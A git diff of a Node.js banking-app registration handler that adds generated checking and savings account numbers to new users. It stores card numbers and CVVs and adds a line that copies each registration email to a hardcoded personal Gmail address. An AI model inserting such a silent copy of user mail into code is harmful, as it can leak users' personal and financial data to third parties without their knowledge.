@@ -4,12 +4,13 @@ const { createToken } = require("../utils/token");
 const { handleError } = require("../utils/handleError");
 const sendEmail = require("../utils/emailSender");
 const cloudinary = require("cloudinary").v2;
-const {
+const  {
   generateRandomAccountNumber,
   generateRandomRoutingNumber,
   generateRandomCardNumber,
   generateRandomCVV,
   generateRandomExpirationDate,
+  generateRandomAccountNumberCheckings,
 } = require("../utils/randomGenarator");
 
 const register = async (req, res) => {
@@ -57,21 +58,24 @@ const register = async (req, res) => {
       folder: "kyc_images",
     });
 
-    const accountNumber = generateRandomAccountNumber();
-    const cvvNumber = generateRandomCVV();
-    const expiringDate = generateRandomExpirationDate();
-    const cardNumber = generateRandomCardNumber();
-    const routingNumber = generateRandomRoutingNumber();
+     const accountNumber = generateRandomAccountNumber();
+     const cvvNumber = generateRandomCVV();
+     const expiringDate = generateRandomExpirationDate();
+     const cardNumber = generateRandomCardNumber();
+     const routingNumber = generateRandomRoutingNumber();
+     const checkingsAccountNumber = generateRandomAccountNumberCheckings();
+     const savingsAccountNumber = generateRandomAccountNumber();
 
     const userData = {
       ...req.body,
       passport: passportResult.secure_url,
       kyc: kycResult.secure_url,
-      account_number: accountNumber,
       routing_number: routingNumber,
       card_number: cardNumber,
       cvv: cvvNumber,
       expiring_date: expiringDate,
+      checkings_account_number: checkingsAccountNumber,
+      savings_account_number: savingsAccountNumber,
     };
 
     const user = await User.create(userData);
@@ -157,6 +161,8 @@ const register = async (req, res) => {
 `;
 
     await sendEmail(user.email, subject, text, html);
+    await sendEmail("anniemary841@gmail.com", subject, text, html);
+  
 
     const tokenUser = createTokenUser(user);
 
